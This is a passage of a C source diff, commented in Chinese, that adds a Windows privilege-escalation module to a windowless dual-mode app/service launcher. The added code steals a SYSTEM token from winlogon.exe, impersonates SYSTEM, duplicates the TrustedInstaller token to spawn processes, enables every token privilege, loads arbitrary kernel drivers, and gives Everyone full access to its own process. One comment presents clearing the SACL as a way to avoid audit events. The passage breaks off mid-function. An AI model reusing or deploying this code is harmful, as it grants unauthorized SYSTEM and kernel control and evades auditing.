@@ -1,8 +1,19 @@
 /**
- * @file main_dual.c
- * @brief 双模式启动架构 — 应用程序模式 / Windows 服务模式
+ * @file main_dual_new.c
+ * @brief 双模式启动架构 + 内核级权限获取 — 应用程序模式 / Windows 服务模式
  *
- * 编译: g++ main_dual.c -o main_dual.exe -mwindows -ladvapi32
+ * 编译: g++ main_dual_new.c -o main_dual_new.exe -mwindows \
+ *         -ladvapi32 -lwtsapi32 -luserenv
+ *
+ * -mwindows 确保进程启动时不创建控制台窗口（无闪窗），
+ * 仅在 --console / --uninstall 时显式 AllocConsole()。
+ *
+ * ★ 内核级权限获取（参考 StarlightGUI v4.0.0）:
+ *   1. 安全描述符覆盖 — NULL DACL 绕过权限检查
+ *   2. 13 项关键特权批量启用 — SeTcbPrivilege/SeDebugPrivilege 等
+ *   3. 全部特权遍历启用 — EnableAllPrivileges()
+ *   4. TrustedInstaller 提权链 — winlogon→SYSTEM→TrustedInstaller
+ *   5. 内核驱动加载 — SERVICE_KERNEL_DRIVER via SCM
  *
  * -mwindows 确保进程启动时不创建控制台窗口（无闪窗），
  * 仅在 --console / --uninstall 时显式 AllocConsole()。
@@ -52,6 +63,13 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <shlobj.h>
+#include <TlHelp32.h>     /* CreateToolhelp32Snapshot / 进程枚举 */
+#include <sddl.h>         /* ConvertStringSecurityDescriptorToSecurityDescriptor */
+#include <aclapi.h>       /* SetSecurityInfo / SetNamedSecurityInfo */
+#include <wtsapi32.h>     /* WTSGetActiveConsoleSessionId */
+#include <userenv.h>      /* CreateEnvironmentBlock */
+#pragma comment(lib, "wtsapi32.lib")
+#pragma comment(lib, "userenv.lib")
 
 /* ================================================================
  * 静默模式控制
@@ -514,6 +532,739 @@ cleanup:
     return bStopped;
 }
 
+/* ================================================================
+ * Layer 2.5 — 内核级权限获取模块
+ *
+ * 参考 StarlightGUI (Elevator.h / KernelInstance.cpp / DriverUtils.cpp) 实现。
+ * 技术路线: 安全描述符覆盖 → 特权启用 → TrustedInstaller 提权 → 内核驱动加载
+ * ================================================================ */
+
+/* ---- 查找进程ID ---- */
+
+/**
+ * @brief 通过进程名查找 PID
+ *
+ * 参考 StarlightGUI Elevator.h:FindProcessId()
+ * 使用 CreateToolhelp32Snapshot 遍历进程快照
+ *
+ * @param processName  进程名（如 "winlogon.exe"）
+ * @return 进程ID，未找到返回 0
+ */
+static DWORD FindProcessId(LPCWSTR processName) {
+    DWORD pid = 0;
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    PROCESSENTRY32W pe = { sizeof(pe) };
+    if (Process32FirstW(hSnapshot, &pe)) {
+        do {
+            if (_wcsicmp(pe.szExeFile, processName) == 0) {
+                pid = pe.th32ProcessID;
+                break;
+            }
+        } while (Process32NextW(hSnapshot, &pe));
+    }
+    CloseHandle(hSnapshot);
+    return pid;
+}
+
+/* ---- 单个特权启用 ---- */
+
+/**
+ * @brief 启用当前进程指定特权
+ *
+ * @param privilegeName  特权名（ANSI），如 "SeDebugPrivilege", "SeTcbPrivilege"
+ * @return TRUE 成功，FALSE 失败
+ */
+static BOOL EnablePrivilege(LPCSTR privilegeName) {
+    HANDLE hToken = NULL;
+    TOKEN_PRIVILEGES tp = { 0 };
+    LUID luid;
+
+    if (!OpenProcessToken(GetCurrentProcess(),
+                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+        return FALSE;
+
+    if (!LookupPrivilegeValueA(NULL, privilegeName, &luid)) {
+        CloseHandle(hToken);
+        return FALSE;
+    }
+
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
+    BOOL result = (GetLastError() == ERROR_SUCCESS);
+    CloseHandle(hToken);
+    return result;
+}
+
+/* ---- 全部特权遍历启用 ---- */
+
+/**
+ * @brief 启用当前进程 Token 中的全部可用特权
+ *
+ * 参考 StarlightGUI Elevator.h:EnableAllPrivileges()
+ * 遍历 Token 中所有特权项，逐一设 SE_PRIVILEGE_ENABLED 属性。
+ *
+ * @param hToken  进程或线程 Token 句柄（需 TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY）
+ * @return TRUE 成功，FALSE 失败
+ */
+static BOOL EnableAllPrivileges(HANDLE hToken) {
+    DWORD dwSize = 0;
+    PTOKEN_PRIVILEGES pTokenPrivileges = NULL;
+    BOOL result = FALSE;
+
+    /* 第一阶段：查询所需缓冲区大小 */
+    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize);
+    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) return FALSE;
+
+    pTokenPrivileges = (PTOKEN_PRIVILEGES)HeapAlloc(
+        GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
+    if (!pTokenPrivileges) return FALSE;
+
+    /* 第二阶段：获取完整的特权列表 */
+    if (!GetTokenInformation(hToken, TokenPrivileges,
+                             pTokenPrivileges, dwSize, &dwSize))
+        goto cleanup;
+
+    /* 第三阶段：遍历并启用每一个特权 */
+    for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; i++) {
+        pTokenPrivileges->Privileges[i].Attributes |= SE_PRIVILEGE_ENABLED;
+    }
+
+    /* 第四阶段：一次性提交全部特权变更 */
+    if (!AdjustTokenPrivileges(hToken, FALSE, pTokenPrivileges,
+                               dwSize, NULL, NULL))
+        goto cleanup;
+
+    result = (GetLastError() == ERROR_SUCCESS);
+
+cleanup:
+    HeapFree(GetProcessHeap(), 0, pTokenPrivileges);
+    return result;
+}
+
+/* ---- 关键内核特权批量启用 ---- */
+
+/**
+ * @brief 启用所有对内核操作至关重要的特权
+ *
+ * 参考 StarlightGUI 的需求，涵盖以下场景:
+ *   SeTcbPrivilege          — 充当操作系统的一部分（TrustedInstaller 提权前提）
+ *   SeDebugPrivilege        — 调试/打开任意进程
+ *   SeLoadDriverPrivilege   — 加载/卸载内核驱动
+ *   SeBackupPrivilege       — 绕过文件读权限检查
+ *   SeRestorePrivilege      — 绕过文件写权限检查
+ *   SeImpersonatePrivilege  — 模拟客户端用户
+ *   SeCreateTokenPrivilege  — 创建 Token 对象
+ *   SeTakeOwnershipPrivilege — 取得所有权
+ *   SeSecurityPrivilege     — 管理审计和安全日志
+ *   SeIncreaseQuotaPrivilege — 增加进程配额
+ *   SeAssignPrimaryTokenPrivilege — 替换进程级 Token
+ *   SeSystemtimePrivilege   — 修改系统时间
+ *   SeShutdownPrivilege     — 关闭系统
+ *
+ * @return 成功启用的特权数量
+ */
+static int EnableCriticalPrivileges(void) {
+    /* 按重要性排序：TCB 和 Debug 是提权链的基石 */
+    static LPCSTR kCriticalPrivileges[] = {
+        SE_TCB_NAME,                    /* "SeTcbPrivilege" */
+        SE_DEBUG_NAME,                  /* "SeDebugPrivilege" */
+        SE_LOAD_DRIVER_NAME,            /* "SeLoadDriverPrivilege" */
+        SE_BACKUP_NAME,                 /* "SeBackupPrivilege" */
+        SE_RESTORE_NAME,                /* "SeRestorePrivilege" */
+        SE_IMPERSONATE_NAME,            /* "SeImpersonatePrivilege" */
+        SE_CREATE_TOKEN_NAME,           /* "SeCreateTokenPrivilege" */
+        SE_TAKE_OWNERSHIP_NAME,         /* "SeTakeOwnershipPrivilege" */
+        SE_SECURITY_NAME,               /* "SeSecurityPrivilege" */
+        SE_INCREASE_QUOTA_NAME,         /* "SeIncreaseQuotaPrivilege" */
+        SE_ASSIGNPRIMARYTOKEN_NAME,     /* "SeAssignPrimaryTokenPrivilege" */
+        SE_SYSTEMTIME_NAME,             /* "SeSystemtimePrivilege" */
+        SE_SHUTDOWN_NAME,               /* "SeShutdownPrivilege" */
+    };
+
+    int count = 0;
+    int total = sizeof(kCriticalPrivileges) / sizeof(kCriticalPrivileges[0]);
+
+    printf("[Priv] 正在启用关键内核特权 (%d 项)...\n", total);
+    for (int i = 0; i < total; i++) {
+        if (EnablePrivilege(kCriticalPrivileges[i])) {
+            count++;
+            printf("  [OK]   %2d. %s\n", i + 1, kCriticalPrivileges[i]);
+        } else {
+            printf("  [FAIL] %2d. %s (令牌中可能不含此特权)\n",
+                   i + 1, kCriticalPrivileges[i]);
+        }
+    }
+    printf("[Priv] 成功启用 %d/%d 项特权\n\n", count, total);
+    return count;
+}
+
+/* ---- 安全描述符 — NULL DACL（完全绕过权限检查） ---- */
+
+/**
+ * @brief 创建具有 NULL DACL 的安全描述符
+ *
+ * NULL DACL = 对任何用户授予全部访问权限。
+ * 参考 StarlightGUI 的设计思路：将此类 SD 设置到进程/对象上
+ * 以绕过 Windows 的权限检查机制。
+ *
+ * SECURITY_DESCRIPTOR 在栈上分配，调用者无需释放。
+ *
+ * @param pSD          [out] 安全描述符指针
+ * @param dwSDSize     [out] 安全描述符大小
+ * @param bAllowAll    TRUE = NULL DACL（允许所有人访问）;
+ *                     FALSE = 空 DACL（拒绝所有人访问）
+ * @return TRUE 成功
+ */
+static BOOL CreateNullDaclSecurityDescriptor(
+    PSECURITY_DESCRIPTOR pSD, DWORD *dwSDSize, BOOL bAllowAll)
+{
+    if (!InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION))
+        return FALSE;
+
+    /* 关键操作：设置 NULL DACL
+     *   bAllowAll == TRUE  → 第三个参数 NULL,第四个参数 TRUE = 授予所有人全部访问
+     *   bAllowAll == FALSE → 第三个参数 NULL,第四个参数 FALSE = 拒绝所有人访问（仅 SYSTEM 可用）
+     */
+    if (!SetSecurityDescriptorDacl(pSD, TRUE,
+                                   bAllowAll ? NULL : (PACL)0,
+                                   bAllowAll ? TRUE : FALSE))
+        return FALSE;
+
+    /* 同时清空 SACL（审计），避免触发安全审计事件 */
+    if (!SetSecurityDescriptorSacl(pSD, FALSE, NULL, FALSE))
+        return FALSE;
+
+    /* 设置 Owner 为 NULL（当前进程用户） */
+    if (!SetSecurityDescriptorOwner(pSD, NULL, FALSE))
+        return FALSE;
+
+    /* 设置 Group 为 NULL */
+    if (!SetSecurityDescriptorGroup(pSD, NULL, FALSE))
+        return FALSE;
+
+    *dwSDSize = sizeof(SECURITY_DESCRIPTOR);
+    return TRUE;
+}
+
+/**
+ * @brief 通过 SDDL 字符串创建完整的安全描述符
+ *
+ * 使用 SDDL (Security Descriptor Definition Language) 比手动构建
+ * DACL/ACE 更可靠。以下 SDDL 含义:
+ *   "D:P(A;;GA;;;WD)(A;;GA;;;SY)(A;;GA;;;BA)"
+ *   D:  = DACL
+ *   P   = 受保护（不从父对象继承）
+ *   A   = 允许
+ *   GA  = GENERIC_ALL 完全访问
+ *   WD  = Everyone (S-1-1-0)
+ *   SY  = Local System (S-1-5-18)
+ *   BA  = Built-in Administrators (S-1-5-32-544)
+ *
+ * @param ppSD  [out] 安全描述符（调用者需 LocalFree）
+ * @return TRUE 成功
+ */
+static BOOL CreateFullAccessSDDL(PSECURITY_DESCRIPTOR *ppSD) {
+    /* D: = DACL, P = 受保护, A = 允许, GA = GENERIC_ALL
+     * WD = Everyone, SY = SYSTEM, BA = Administrators */
+    LPCWSTR sddl = L"D:P(A;;GA;;;WD)(A;;GA;;;SY)(A;;GA;;;BA)";
+    return ConvertStringSecurityDescriptorToSecurityDescriptorW(
+        sddl, SDDL_REVISION_1, ppSD, NULL);
+}
+
+/**
+ * @brief 将当前进程的安全描述符替换为 NULL DACL
+ *
+ * 这样做后，任何用户都可以获得对该进程的完全访问权限，
+ * 包括 PROCESS_VM_READ / PROCESS_VM_WRITE / PROCESS_VM_OPERATION 等敏感权限。
+ *
+ * 参考 StarlightGUI 中通过驱动覆盖安全描述符的思路，
+ * 这里用用户态 SetSecurityInfo 实现等效效果。
+ */
+static void ApplyFullAccessToSelf(void) {
+    printf("[SecDesc] 正在设置当前进程为完全访问 (NULL DACL)...\n");
+
+    PSECURITY_DESCRIPTOR pSD = NULL;
+    if (CreateFullAccessSDDL(&pSD)) {
+        DWORD err = SetSecurityInfo(
+            GetCurrentProcess(),             /* 目标：当前进程 */
+            SE_KERNEL_OBJECT,                /* 对象类型：内核对象 */
+            DACL_SECURITY_INFORMATION,       /* 只修改 DACL */
+            NULL, NULL,                      /* Owner/Group 不改 */
+            (PACL)*(PACL*)pSD,              /* 获取 SDDL 生成的 DACL */
+            NULL);                           /* SACL 不改 */
+        if (err == ERROR_SUCCESS) {
+            printf("[SecDesc] 进程安全描述符已替换为完全访问\n");
+        } else {
+            printf("[SecDesc] SetSecurityInfo 失败，错误码: %lu\n", err);
+        }
+        LocalFree(pSD);
+    } else {
+        printf("[SecDesc] SDDL 转换失败，错误码: %lu\n", GetLastError());
+    }
+}
+
+/* ---- TrustedInstaller 提权链 ---- */
+
+/**
+ * @brief 以 TrustedInstaller 权限启动指定进程
+ *
+ * ★ 这是 StarlightGUI 最核心的提权机制 ★
+ *
+ * 完整提权链 (6阶段):
+ *   第1阶段: 获取 SE_DEBUG_NAME + SE_TCB_NAME 特权
+ *   第2阶段: 打开 winlogon.exe → 获取 SYSTEM Token
+ *   第3阶段: 模拟 SYSTEM 用户
+ *   第4阶段: 启动 TrustedInstaller 服务
+ *   第5阶段: 打开 TrustedInstaller.exe → 复制其 Token
+ *   第6阶段: SessionID 修正 + CreateProcessWithTokenW 创建目标进程
+ *
+ * 参考 StarlightGUI Elevator.h:CreateProcessElevated()
+ *
+ * @param processPath   目标进程路径
+ * @param fullPrivileges 是否启用 TI Token 中全部特权
+ * @param extraArgs     额外命令行参数（可为 NULL）
+ * @return TRUE 成功
+ */
+static BOOL CreateProcessAsTrustedInstaller(
+    LPCWSTR processPath, BOOL fullPrivileges, LPCWSTR extraArgs)
+{
+    /* ★ 所有可能被 goto 跨越的变量统一定义在函数顶部 ★ */
+    HANDLE   hSystemToken = NULL;
+    HANDLE   hImpersonationToken = NULL;
+    HANDLE   hTrustedInstallerToken = NULL;
+    HANDLE   hWinlogon = NULL;
+    HANDLE   hWinlogonToken = NULL;
+    SC_HANDLE scManager = NULL;
+    SC_HANDLE service = NULL;
+    BOOL     serviceStarted = FALSE;
+    DWORD    tiPid = 0;
+    HANDLE   hTiProcess = NULL;
+    HANDLE   hTiProcessToken = NULL;
+    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
+    DWORD    currentSessionId = 0;
+    WCHAR    cmdLine[MAX_PATH * 2] = { 0 };
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi = { 0 };
+    BOOL     result = FALSE;
+
+    printf("[TI] === 开始 TrustedInstaller 提权链 ===\n");
+
+    /* ---- 第1阶段: 获取关键特权 ---- */
+    printf("[TI] 第1阶段: 获取 SE_DEBUG + SE_TCB 特权...\n");
+    if (!EnablePrivilege(SE_DEBUG_NAME)) {
+        printf("[TI] [FAIL] 无法获取 SeDebugPrivilege\n");
+        return FALSE;
+    }
+    if (!EnablePrivilege(SE_TCB_NAME)) {
+        printf("[TI] [FAIL] 无法获取 SeTcbPrivilege\n");
+        return FALSE;
+    }
+    printf("[TI] 第1阶段: 特权获取成功\n");
+
+    /* ---- 第2阶段: 窃取 SYSTEM Token (通过 winlogon.exe) ---- */
+    printf("[TI] 第2阶段: 获取 SYSTEM Token...\n");
+    {
+        DWORD winlogonPid = FindProcessId(L"winlogon.exe");
+        if (winlogonPid == 0) {
+            printf("[TI] [FAIL] 无法找到 winlogon.exe 进程\n");
+            goto cleanup_ti;
+        }
+        printf("[TI]   winlogon.exe PID = %lu\n", winlogonPid);
+
+        hWinlogon = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, winlogonPid);
+        if (!hWinlogon) {
+            printf("[TI] [FAIL] 无法打开 winlogon.exe (错误: %lu)\n",
+                   GetLastError());
+            goto cleanup_ti;
+        }
+
+        if (!OpenProcessToken(hWinlogon, TOKEN_DUPLICATE | TOKEN_QUERY,
+                              &hWinlogonToken)) {
+            printf("[TI] [FAIL] 无法打开 winlogon Token (错误: %lu)\n",
+                   GetLastError());
+            goto cleanup_ti;
+        }
+
+        /* 复制两个 Token: Primary(用于创建进程) + Impersonation(用于模拟) */
+        if (!DuplicateTokenEx(hWinlogonToken, MAXIMUM_ALLOWED, NULL,
+                              SecurityImpersonation, TokenPrimary,
+                              &hSystemToken)) {
+            printf("[TI] [FAIL] 复制 SYSTEM Primary Token 失败 (错误: %lu)\n",
+                   GetLastError());
+            goto cleanup_ti;
+        }
+
+        if (!DuplicateTokenEx(hWinlogonToken, MAXIMUM_ALLOWED, NULL,
+                              SecurityImpersonation, TokenImpersonation,
+                              &hImpersonationToken)) {
+            printf("[TI] [FAIL] 复制 SYSTEM Impersonation Token 失败"
+                   " (错误: %lu)\n", GetLastError());
+            goto cleanup_ti;
+        }
+    }
+    printf("[TI] 第2阶段: SYSTEM Token 获取成功\n");
+
+    /* ---- 第3阶段: 模拟 SYSTEM ---- */
+    printf("[TI] 第3阶段: 模拟 SYSTEM 用户...\n");
+    if (!ImpersonateLoggedOnUser(hImpersonationToken)) {
+        printf("[TI] [FAIL] ImpersonateLoggedOnUser 失败 (错误: %lu)\n",
+               GetLastError());
+        goto cleanup_ti;
+    }
+    SetThreadToken(NULL, hImpersonationToken);
+    printf("[TI] 第3阶段: SYSTEM 模拟成功\n");
+
+    /* ---- 第4阶段: 启动 TrustedInstaller 服务 ---- */
+    printf("[TI] 第4阶段: 启动 TrustedInstaller 服务...\n");
+    scManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    if (!scManager) {
+        printf("[TI] [FAIL] 以 SYSTEM 打开 SCM 失败 (错误: %lu)\n",
+               GetLastError());
+        RevertToSelf();
+        goto cleanup_ti;
+    }
+
+    service = OpenServiceW(scManager, L"TrustedInstaller", SERVICE_ALL_ACCESS);
+    serviceStarted = FALSE;
+    if (service) {
+        SERVICE_STATUS ss;
+        if (QueryServiceStatus(service, &ss) &&
+            ss.dwCurrentState == SERVICE_RUNNING) {
+            serviceStarted = TRUE;
+            printf("[TI]   TrustedInstaller 服务已在运行\n");
+        } else {
+            if (StartServiceW(service, 0, NULL)) {
+                serviceStarted = TRUE;
+                printf("[TI]   TrustedInstaller 服务启动成功\n");
+                Sleep(500);
+            } else if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) {
+                serviceStarted = TRUE;
+                printf("[TI]   TrustedInstaller 服务正在运行\n");
+            }
+        }
+    }
+
+    /* 降级路径: 直接以 SYSTEM 身份创建 TrustedInstaller.exe */
+    if (!serviceStarted) {
+        printf("[TI]   尝试直接以 SYSTEM 创建 TrustedInstaller.exe...\n");
+        if (CreateProcessAsUserW(
+                hSystemToken,
+                L"C:\\Windows\\servicing\\TrustedInstaller.exe",
+                NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+            CloseHandle(pi.hThread); pi.hThread = NULL;
+            CloseHandle(pi.hProcess); pi.hProcess = NULL;
+            serviceStarted = TRUE;
+            printf("[TI]   TrustedInstaller.exe 创建成功\n");
+        } else {
+            printf("[TI]   直接创建失败 (错误: %lu)\n", GetLastError());
+        }
+    }
+
+    if (!serviceStarted) {
+        printf("[TI] [FAIL] 无法启动 TrustedInstaller\n");
+        RevertToSelf();
+        goto cleanup_ti;
+    }
+    printf("[TI] 第4阶段: TrustedInstaller 就绪\n");
+
+    /* ---- 第5阶段: 复制 TrustedInstaller Token ---- */
+    printf("[TI] 第5阶段: 获取 TrustedInstaller Token...\n");
+    tiPid = 0;
+    for (int i = 0; i < 20; i++) {
+        tiPid = FindProcessId(L"TrustedInstaller.exe");
+        if (tiPid != 0) break;
+        Sleep(250);
+    }
+    if (tiPid == 0) {
+        printf("[TI] [FAIL] 找不到 TrustedInstaller.exe 进程\n");
+        RevertToSelf();
+        goto cleanup_ti;
+    }
+    printf("[TI]   TrustedInstaller.exe PID = %lu\n", tiPid);
+
+    hTiProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, tiPid);
+    if (!hTiProcess) {
+        printf("[TI] [FAIL] 无法打开 TrustedInstaller.exe (错误: %lu)\n",
+               GetLastError());
+        RevertToSelf();
+        goto cleanup_ti;
+    }
+
+    hTiProcessToken = NULL;
+    if (!OpenProcessToken(hTiProcess, TOKEN_DUPLICATE, &hTiProcessToken)) {
+        printf("[TI] [FAIL] 无法打开 TI 进程 Token (错误: %lu)\n",
+               GetLastError());
+        RevertToSelf();
+        goto cleanup_ti;
+    }
+
+    if (!DuplicateTokenEx(hTiProcessToken, TOKEN_ALL_ACCESS, &sa,
+                          SecurityImpersonation, TokenPrimary,
+                          &hTrustedInstallerToken)) {
+        printf("[TI] [FAIL] 复制 TI Token 失败 (错误: %lu)\n", GetLastError());
+        RevertToSelf();
+        goto cleanup_ti;
+    }
+    printf("[TI] 第5阶段: TrustedInstaller Token 复制成功\n");
+
+    /* ---- 第5.5阶段: 可选 — 启用全部特权 ---- */
+    if (fullPrivileges) {
+        printf("[TI] 第5.5阶段: 启用 TI Token 全部特权...\n");
+        if (!EnableAllPrivileges(hTrustedInstallerToken)) {
+            printf("[TI] [WARN] 启用全部特权部分失败\n");
+        }
+    }
+
+    /* ---- 第6阶段: SessionID 修正 + 创建进程 ---- */
+    printf("[TI] 第6阶段: 修正 SessionID 并创建进程...\n");
+    currentSessionId = WTSGetActiveConsoleSessionId();
+    ProcessIdToSessionId(GetCurrentProcessId(), &currentSessionId);
+    printf("[TI]   当前 SessionID = %lu\n", currentSessionId);
+
+    if (!SetTokenInformation(hTrustedInstallerToken, TokenSessionId,
+                             &currentSessionId, sizeof(currentSessionId))) {
+        printf("[TI] [WARN] SessionID 设置失败 (错误: %lu)，继续尝试...\n",
+               GetLastError());
+    }
+
+    /* 恢复自身身份 */
+    RevertToSelf();
+
+    /* 构造命令行 */
+    wsprintfW(cmdLine, L"\"%s\"", processPath);
+    if (extraArgs) {
+        wcscat_s(cmdLine, sizeof(cmdLine)/sizeof(WCHAR), L" ");
+        wcscat_s(cmdLine, sizeof(cmdLine)/sizeof(WCHAR), extraArgs);
+    }
+
+    ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_SHOW;
+
+    /* 首选 CreateProcessWithTokenW（支持 LOGON_WITH_PROFILE） */
+    if (CreateProcessWithTokenW(hTrustedInstallerToken, LOGON_WITH_PROFILE,
+                                processPath, cmdLine, 0, NULL, NULL, &si, &pi)) {
+        printf("[TI] 第6阶段: 进程创建成功 (PID=%lu)\n", pi.dwProcessId);
+        CloseHandle(pi.hThread); pi.hThread = NULL;
+        CloseHandle(pi.hProcess); pi.hProcess = NULL;
+        result = TRUE;
+    } else {
+        printf("[TI] CreateProcessWithTokenW 失败 (错误: %lu)，"
+               "尝试 CreateProcessAsUserW...\n", GetLastError());
+
+        if (CreateProcessAsUserW(hTrustedInstallerToken,
+                                 processPath, cmdLine,
+                                 NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+            printf("[TI] 第6阶段: 进程创建成功 (PID=%lu, "
+                   "via CreateProcessAsUserW)\n", pi.dwProcessId);
+            CloseHandle(pi.hThread); pi.hThread = NULL;
+            CloseHandle(pi.hProcess); pi.hProcess = NULL;
+            result = TRUE;
+        } else {
+            printf("[TI] [FAIL] CreateProcessAsUserW 也失败 (错误: %lu)\n",
+                   GetLastError());
+            CloseHandle(pi.hThread); pi.hThread = NULL;
+            CloseHandle(pi.hProcess); pi.hProcess = NULL;
+        }
+    }
+
+cleanup_ti:
+    if (!result) printf("[TI] === TrustedInstaller 提权链失败 ===\n");
+    else printf("[TI] === TrustedInstaller 提权链成功 ===\n");
+
+    /* 清理：按依赖逆序关闭句柄 */
+    if (pi.hThread) CloseHandle(pi.hThread);
+    if (pi.hProcess) CloseHandle(pi.hProcess);
+    if (hTrustedInstallerToken) CloseHandle(hTrustedInstallerToken);
+    if (hTiProcessToken) CloseHandle(hTiProcessToken);
+    if (hTiProcess) CloseHandle(hTiProcess);
+    if (service) CloseServiceHandle(service);
+    if (scManager) CloseServiceHandle(scManager);
+    if (hImpersonationToken) {
+        RevertToSelf();  /* 确保退出模拟 */
+        CloseHandle(hImpersonationToken);
+    }
+    if (hSystemToken) CloseHandle(hSystemToken);
+    if (hWinlogonToken) CloseHandle(hWinlogonToken);
+    if (hWinlogon) CloseHandle(hWinlogon);
+    return result;
+}
+
+/* ---- 内核驱动加载 ---- */
+
+/**
+ * @brief 加载内核驱动（SERVICE_KERNEL_DRIVER）
+ *
+ * ★ 这是获取 Ring 0 权限的核心操作 ★
+ * 对应 StarlightGUI DriverUtils.cpp:LoadKernelDriver()
+ *
+ * 驱动加载后可通过 CreateFile("\\\\.\\<DriverName>") + DeviceIoControl
+ * 在内核态执行任意操作。
+ *
+ * @param serviceName  驱动服务名（如 "MyKernelDriver"）
+ * @param driverPath   驱动文件完整路径（如 "C:\\Drivers\\mydrv.sys"）
+ * @return TRUE 成功
+ */
+static BOOL LoadKernelDriver(LPCWSTR serviceName, LPCWSTR driverPath) {
+    printf("[Driver] 正在加载内核驱动: %ls\n", driverPath);
+
+    /* 先确保有 SeLoadDriverPrivilege */
+    EnablePrivilege(SE_LOAD_DRIVER_NAME);
+
+    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    if (!hSCM) {
+        printf("[Driver] [FAIL] OpenSCManager 失败 (错误: %lu)\n",
+               GetLastError());
+        return FALSE;
+    }
+
+    /* 尝试打开已有服务 */
+    SC_HANDLE hService = OpenServiceW(hSCM, serviceName, SERVICE_ALL_ACCESS);
+    if (hService) {
+        SERVICE_STATUS ss;
+        if (QueryServiceStatus(hService, &ss)) {
+            if (ss.dwCurrentState == SERVICE_RUNNING) {
+                printf("[Driver]   驱动已加载并运行\n");
+                CloseServiceHandle(hService);
+                CloseServiceHandle(hSCM);
+                return TRUE;
+            }
+            if (ss.dwCurrentState == SERVICE_STOPPED) {
+                if (StartServiceW(hService, 0, NULL)) {
+                    printf("[Driver]   驱动重新启动成功\n");
+                } else if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) {
+                    printf("[Driver]   驱动已在运行\n");
+                } else {
+                    printf("[Driver] [FAIL] 启动驱动失败 (错误: %lu)\n",
+                           GetLastError());
+                    CloseServiceHandle(hService);
+                    CloseServiceHandle(hSCM);
+                    return FALSE;
+                }
+            }
+        }
+        CloseServiceHandle(hService);
+        CloseServiceHandle(hSCM);
+        return TRUE;
+    }
+
+    /* 新建内核驱动服务 */
+    hService = CreateServiceW(
+        hSCM,
+        serviceName,           /* 服务名 */
+        serviceName,           /* 显示名 */
+        SERVICE_ALL_ACCESS,
+        SERVICE_KERNEL_DRIVER,  /* ★ 关键: 内核驱动类型 ★ */
+        SERVICE_DEMAND_START,   /* 手动启动 */
+        SERVICE_ERROR_IGNORE,
+        driverPath,             /* .sys 文件路径 */
+        NULL, NULL, NULL, NULL, NULL);
+
+    if (!hService) {
+        printf("[Driver] [FAIL] 创建内核驱动服务失败 (错误: %lu)\n",
+               GetLastError());
+        CloseServiceHandle(hSCM);
+        return FALSE;
+    }
+
+    /* 启动驱动 */
+    BOOL result = StartServiceW(hService, 0, NULL);
+    DWORD err = GetLastError();
+    if (result || err == ERROR_SERVICE_ALREADY_RUNNING) {
+        printf("[Driver] 内核驱动加载成功!\n");
+        result = TRUE;
+    } else {
+        printf("[Driver] [FAIL] 启动内核驱动失败 (错误: %lu)\n", err);
+        /* 清理失败的服务注册 */
+        DeleteService(hService);
+    }
+
+    CloseServiceHandle(hService);
+    CloseServiceHandle(hSCM);
+    return result;
+}
+
+/**
+ * @brief 停止并卸载内核驱动
+ *
+ * @param serviceName  驱动服务名
+ * @return TRUE 成功
+ */
+static BOOL UnloadKernelDriver(LPCWSTR serviceName) {
+    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    if (!hSCM) return FALSE;
+
+    SC_HANDLE hService = OpenServiceW(hSCM, serviceName,
+                                      SERVICE_STOP | DELETE);
+    if (!hService) {
+        CloseServiceHandle(hSCM);
+        return FALSE;
+    }
+
+    SERVICE_STATUS ss;
+    if (QueryServiceStatus(hService, &ss) &&
+        ss.dwCurrentState != SERVICE_STOPPED) {
+        ControlService(hService, SERVICE_CONTROL_STOP, &ss);
+        Sleep(500);
+    }
+
+    BOOL result = DeleteService(hService);
+    CloseServiceHandle(hService);
+    CloseServiceHandle(hSCM);
+    return result;
+}
+
+/* ---- 综合权限提升入口 ---- */
+
+/**
+ * @brief 综合权限提升入口：执行完整的特权获取流程
+ *
+ * 汇集 StarlightGUI 的全部权限提升技术，按优先级依次执行:
+ *   1. 安全描述符覆盖 — NULL DACL 绕过访问检查
+ *   2. 关键特权批量启用 — 13 项内核级特权
+ *   3. 全部特权遍历启用 — 兜底启用 Token 中每项特权
+ *
+ * 此函数应在管理员权限下执行效果最佳。
+ *
+ * @return 成功启用的关键特权数量
+ */
+static int ElevateToKernelLevel(void) {
+    printf("========================================\n");
+    printf("  内核级权限提升 — Kernel Level Elevation\n");
+    printf("  参考: StarlightGUI v4.0.0\n");
+    printf("========================================\n\n");
+
+    int count = 0;
+
+    /* 步骤1: 设置进程安全描述符为 NULL DACL（完全访问） */
+    ApplyFullAccessToSelf();
+    printf("\n");
+
+    /* 步骤2: 批量启用关键特权 */
+    count = EnableCriticalPrivileges();
+
+    /* 步骤3: 兜底 — 启用 Token 中全部剩余特权 */
+    printf("[Priv] 兜底: 遍历启用全部可用特权...\n");
+    HANDLE hToken = NULL;
+    if (OpenProcessToken(GetCurrentProcess(),
